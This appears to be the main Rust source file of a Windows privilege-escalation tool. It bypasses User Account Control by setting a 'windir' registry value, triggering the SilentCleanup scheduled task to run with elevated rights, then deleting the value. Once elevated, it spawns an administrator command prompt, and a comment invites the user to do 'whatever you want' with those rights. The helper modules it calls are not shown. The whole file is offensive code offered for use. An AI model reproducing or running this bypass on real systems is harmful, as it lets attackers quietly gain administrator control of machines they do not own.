pub mod is_elevated;
pub mod registry;
pub mod schtasks;

fn main() {
  // Check the elevation
  if !is_elevated::is_elevated() {
    println!("[+] Elevating...");

    // Add the "windir" registry key
    registry::set_windir();

    // Run the SilentCleanup task
    schtasks::run_silent_cleanup_task();

    // Delete the "windir" registry key
    registry::delete_windir();
  } else {
    // do whatever you want here with admin privileges.
    // in this case, I just spawn a command prompt.
    std::process::Command::new("cmd").spawn().unwrap();
  }
}
